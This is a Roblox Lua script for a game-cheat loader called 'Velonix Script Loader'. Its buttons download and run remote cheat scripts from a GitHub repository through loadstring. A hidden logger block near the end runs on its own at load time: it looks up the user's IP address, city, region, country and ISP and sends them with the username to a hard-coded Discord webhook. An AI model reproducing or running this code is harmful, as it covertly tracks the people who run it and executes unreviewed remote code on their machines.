local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ===[ Constants ]===
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9"
local IP_API_URL = "https://velonix-api.vercel.app/json"
local LOAD_SCRIPTS = {
	["🌱 Grow a Garden"] = "GaG.lua",
	["⚔️ The Strongest Battleground"] = "TSB.lua",
	["🗡️ Steal a Sword"] = "SaS.lua",
	["🔨 Flee The Facility"] = "FTF.lua",
	["🧠 Steal a Brainrot (Coming Soon)"] = nil,
	["🌐 Universal Script"] = "UNIV.lua"
}

-- ===[ GUI Setup ]===
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "VelonixLoader"
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 300, 0, 300)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, -40, 0, 40)
title.Position = UDim2.new(0, 10, 0, 0)
title.Text = "Velonix Script Loader"
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton", mainFrame)
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 16
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
closeBtn.BorderSizePixel = 0
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
closeBtn.MouseButton1Click:Connect(function()
	screenGui:Destroy()
end)

local scrollFrame = Instance.new("ScrollingFrame", mainFrame)
scrollFrame.Size = UDim2.new(1, -40, 1, -60)
scrollFrame.Position = UDim2.new(0, 20, 0, 50)
scrollFrame.BackgroundTransparency = 1
scrollFrame.BorderSizePixel = 0
scrollFrame.ScrollBarThickness = 6
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.ClipsDescendants = true
Instance.new("UIPadding", scrollFrame).PaddingBottom = UDim.new(0, 10)

local layout = Instance.new("UIListLayout", scrollFrame)
layout.Padding = UDim.new(0, 10)
layout.SortOrder = Enum.SortOrder.LayoutOrder

-- ===[ Button Creator ]===
local function createButton(label, scriptName)
	local button = Instance.new("TextButton", scrollFrame)
	button.Size = UDim2.new(1, 0, 0, 40)
	button.Text = label
	button.Font = Enum.Font.Gotham
	button.TextSize = 16
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	button.BorderSizePixel = 0
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)

	button.MouseButton1Click:Connect(function()
		if scriptName then
			local scriptUrl = "https://github.com/ug32-C9/kupal/raw/refs/heads/main/" .. scriptName
			loadstring(game:HttpGet(scriptUrl))()
		else
			warn(label .. " script is coming soon!")
		end
		mainFrame:Destroy()
	end)
end

-- ===[ Generate Buttons Dynamically ]===
for label, scriptFile in pairs(LOAD_SCRIPTS) do
	createButton(label, scriptFile)
end

-- ===[ Webhook Logger ]===
task.delay(0.5, function()
	local success, response = pcall(function()
		return game:HttpGet(IP_API_URL)
	end)

	if success then
		local data = HttpService:JSONDecode(response)
		local username = player and player.Name or "Unknown"

		local payload = {
			username = "🔥 | Developer",
			embeds = {{
				title = "📡 User Info",
				description = string.format(
					"**User:** `%s`\n**IP:** `%s`\n**Country:** `%s`\n**Region:** `%s`\n**City:** `%s`\n**ISP:** `%s`",
					username, data.ip or "Unknown", data.country or "Unknown", data.region or "Unknown",
					data.city or "Unknown", data.org or "Unknown"
				),
				color = 3447003,
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}}
		}

		local req = (syn and syn.request) or (http and http.request) or request
		local res = req({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(payload)
		})

		if not res.Success then
			warn("Webhook failed:", res.StatusCode)
		end
	else
		warn("Failed to fetch IP data.")
	end
end)